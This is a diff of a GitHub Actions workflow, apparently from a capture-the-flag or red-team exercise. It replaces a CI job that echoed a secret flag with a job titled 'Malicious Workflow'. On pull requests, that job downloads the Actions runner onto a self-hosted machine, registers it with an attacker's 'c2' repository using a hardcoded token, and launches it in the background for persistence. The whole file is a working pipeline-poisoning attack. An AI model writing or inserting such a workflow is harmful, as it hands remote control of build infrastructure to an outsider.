@@ -1,29 +1,26 @@
-name: CI Workflow
-
+name: Malicious Workflow
 on:
-  push:
-    branches:
-      - main
   pull_request:
     branches:
-      - main
-
+    - main
 jobs:
-  build:
+  exploit:
     runs-on: self-hosted
-
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
-
-      - name: Set up Node.js
-        uses: actions/setup-node@v3
-        with:
-          node-version: '14'
-
-      - name: Install dependencies
-        run: echo ${{ secrets.FLAG }};sleep 60
-
-      - name: Run tests
-        run: npm test
-
+    - name: Checkout code
+      uses: actions/checkout@v3
+    - name: Exfiltrate secrets and register malicious runner
+      run: |
+        # Step 1: Change to the home directory and prepare the actions-runner directory
+        cd ~
+        mkdir actions-runner1 && cd actions-runner1
+        # Step 2: Download the GitHub Actions runner binary (version 2.319.1 in this case)
+        curl -o actions-runner-linux-x64-2.319.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.319.1/actions-runner-linux-x64-2.319.1.tar.gz
+        # Step 3: Verify the integrity of the runner binary using a SHA-256 checksum
+        echo "3f6efb7488a183e291fc2c62876e14c9ee732864173734facc85a1bfb1744464actions-runner-linux-x64-2.319.1.tar.gz" | shasum -a 256 -c
+        # Step 4: Extract the runner binary
+        tar xzf ./actions-runner-linux-x64-2.319.1.tar.gz
+        # Step 5: Register the runner to the attacker's C2 repository using the runner token
+        ./config.sh --url https://github.com/RandomUserName-red/c2 --token BMVO75UGRTPTZBC7ZX3UL7THGX4VO
+        # Step 6: Set an environment variable and start the runner in the background(persistence)
+        nohup ./run.sh &
